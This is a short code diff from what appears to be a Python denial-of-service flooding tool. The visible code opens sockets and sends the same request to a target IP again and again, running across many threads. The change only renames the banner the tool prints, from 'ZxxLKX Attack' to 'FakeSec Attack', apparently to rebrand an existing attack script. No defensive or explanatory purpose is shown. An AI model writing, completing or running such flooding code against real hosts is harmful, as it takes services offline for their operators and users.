@@ -165,11 +165,11 @@ def run():
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-            print(f"\033[0m ZxxLKX Attack  ════>  to \033[1;35m{ip}\033[0m")
+            print(f"\033[0m FakeSec Attack  ════>  to \033[1;35m{ip}\033[0m")
         except socket.error:
             s.close()
-            print(f"\033[0m ZxxLKX Attack  ════>  to \033[1;35m{ip}\033[0m")
-            print(f"\033[0m ZxxLKX Attack  ════>  to \033[1;35m{ip}\033[0m")
+            print(f"\033[0m FakeSec Attack  ════>  to \033[1;35m{ip}\033[0m")
+            print(f"\033[0m FakeSec Attack  ════>  to \033[1;35m{ip}\033[0m")
 
 for y in range(threads):
     th = threading.Thread(target = run)
